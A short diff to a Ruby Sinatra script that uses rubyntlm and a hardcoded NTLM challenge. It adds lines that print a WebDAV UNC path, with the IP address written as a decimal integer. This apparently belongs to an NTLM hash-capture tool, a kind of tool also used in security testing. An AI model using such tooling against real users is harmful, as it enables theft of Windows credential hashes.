@@ -10,6 +10,10 @@ require 'rubyntlm'
 $HOST = ARGV[0] || '192.168.205.1'
 $PORT = ARGV[1] || 9090
 
+puts "="*40
+puts "WebDAV Path: \\\\#{IPAddr.new($HOST).to_i}@#{$PORT}\\file"
+puts "="*40
+
 class Sinatra::Base
   module HashTools
     CHALLENGE = 'TlRMTVNTUAACAAAABgAGADgAAAAFAomiESIzRFVmd4gAAAAAAAAAAIAAgAA+AAAABQL'+
